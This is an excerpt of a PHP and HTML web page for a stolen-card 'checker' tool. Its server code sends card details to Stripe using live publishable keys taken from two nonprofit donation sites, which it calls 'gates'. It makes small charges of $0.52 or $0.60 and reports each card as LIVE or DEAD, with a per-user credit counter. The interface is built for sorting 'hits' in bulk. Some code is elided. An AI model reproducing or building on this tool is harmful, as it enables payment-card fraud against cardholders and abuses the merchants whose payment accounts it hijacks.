...
.err{color:#f85149;margin-bottom:15px;font-size:13px;font-weight:bold;background:rgba(248,81,73,0.1);padding:8px;border-radius:8px}
</style></head>
...
if ($_SERVER['REQUEST_METHOD'] === 'POST' && !isset($_POST['login_key'])) {
    ...
    // Step 1: Stripe Tokenization (New Fixed Gates)
    if($gate == "gate1") {
        $pk = 'pk_live_51LqLrcKuYyCGsqVmBqB3jxUQeCs9GCzZG82Y0qXBJdE6WyvpXeKTBGpJ0xv0ObkWN98nTCwHInf77IpJv5Ka1ZEk00zcyPxtd9';
        $site = 'https://mauritaniancommunity-dmv-usa.org';
    } else {
        $pk = 'pk_live_X8I5Jg4Cf3h2FfLSP7fZ2JwS';
        $site = 'https://www.massairspace.org';
    }

    $ch1 = curl_init('https://api.stripe.com/v1/payment_methods');
    curl_setopt($ch1, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch1, CURLOPT_POST, true);
    curl_setopt($ch1, CURLOPT_HTTPHEADER, ['authority: api.stripe.com', 'origin: https://js.stripe.com', 'user-agent: '.$ua]);
    ...
    if (!$pm) {
        ...
        echo json_encode(["status" => "DEAD", "msg" => "$err ( HEYOz🔥 )"]); exit;
    }
    ...
    echo json_encode(["status" => $st, "msg" => "$m (Credits: $rem_c) ( HEYOz🔥 )"]); exit;
}
?>
<!DOCTYPE html>
<html lang="en">
...
<div class="wrapper">
    ...
    <select id="gate" class="gate-select"><option value="gate1">⚡ GATE 1: STRIPE $0.52 (Mauritanian)</option><option value="gate2">⚡ GATE 2: STRIPE $0.60 (Massairspace)</option></select>
    ...
    <div class="stats">
        ...
        <div class="stat-box"><small>Dead</small><span id="c_dead" class="DEAD">0</span></div>
    </div>
    <div class="result-box"><div class="res-head" style="color:#3fb950" onclick="toggleBox('l_live')"><span><i class="fa-solid fa-circle-check"></i> HIT / LIVE</span> <i class="fa-solid fa-chevron-down"></i></div><div class="res-body" id="l_live"></div></div>
